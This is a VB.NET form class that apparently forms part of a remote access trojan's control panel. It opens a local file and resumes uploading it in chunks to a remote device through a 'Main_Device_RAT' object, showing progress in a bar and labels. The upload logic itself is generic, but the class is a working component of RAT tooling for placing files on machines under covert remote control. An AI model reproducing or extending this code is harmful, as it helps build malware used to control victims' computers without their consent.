Public Class Upload
    Public Rat As New Main_Device_RAT
    Public File As String
    Public Path As String
    Public Uploaded As Long
    Public Filesize As Long
    Public Stream As IO.Stream
    Private Sub Upload_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            TextBox1.Text = File
            TextBox2.Text = Path
            Filesize = (New IO.FileInfo(File)).Length
            Form1.Connect()
            Uploaded = Rat.GetFileSize(Path)
            Stream = New IO.FileStream(File, IO.FileMode.Open)
            Stream.Position = Uploaded
            Me.Stream = Stream
            Lblsize.Text = Filesize.ToString & "Bytes"
            Lblsent.Text = Uploaded.ToString & "Bytes"
            Timer1.Interval = 1
            Timer2.Interval = 1
            Timer1.Start()
            Timer2.Start()
        Catch ex As Exception
            Me.Close()
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        If CheckBox1.Checked = True Then
            Try
                Form1.Connect()
                Dim Blocksize As Integer = Me.NumericUpDown1.Value
                If Uploaded + Blocksize > Filesize Then
                    Dim Bytes(Filesize - Uploaded - 1) As Byte
                    Stream.Read(Bytes, 0, Bytes.Length)
                    Rat.UploadFilePart(Path, Uploaded, Bytes.Length, Bytes)
                    Uploaded = Uploaded + Bytes.Length
                Else
                    Dim Bytes(Blocksize - 1) As Byte
                    Stream.Read(Bytes, 0, Bytes.Length)
                    Rat.UploadFilePart(Path, Uploaded, Bytes.Length, Bytes)
                    Uploaded = Uploaded + Bytes.Length
                End If
            Catch ex As Exception
            End Try
            If Filesize <= Uploaded Then CheckBox1.Checked = False
        End If
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        If Filesize <= Uploaded Then
            ProgressBar1.Value = 100
        Else
            ProgressBar1.Value = Uploaded / Filesize * 100
        End If
        Lblsent.Text = Uploaded.ToString & "Bytes"
    End Sub
End Class